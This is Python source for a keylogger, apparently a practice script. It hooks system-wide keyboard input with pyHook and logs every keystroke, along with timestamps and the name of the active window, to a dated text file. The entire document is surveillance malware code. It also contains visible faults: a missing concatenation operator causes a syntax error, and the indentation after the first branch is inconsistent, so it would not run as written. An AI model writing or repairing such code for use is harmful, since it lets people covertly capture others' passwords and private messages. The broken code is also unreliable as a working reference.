import pyHook , pythoncom , sys , logging , time

file_log = 'G:\Python Pratice\keylogger_log_file.txt'

file_log += time.strftime("%d. %m. %Y") + ".txt"

x = time.ctime()

with open (file_log , "a") as f:
	f.write("\n")
	f.write("[" + x + "] : ")

def OnKeyboradEvent(event):
	global x
	if event.Key == "Return" :
		with open(file_log, "a") as f:
			f.write(" {Enter}\n ")
			f.write("[" + x + "|" + event.WindowName "] : ")
 
 	elif event.Key == "Space" :
 		with open(file_log,"a") as f:
 			f.write(" ")

 	elif event.Key == "Back":
 		with open(file_log, "a") as f:
 			f.write("BackSpace")

 	else :
 		with open(file_log, "a") as f:
 			f.write(event.Key)

 	return True

 hooks_manager = pyHook.HookManager()
 hooks_manager.KeyDown = OnKeyboradEvent
 hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
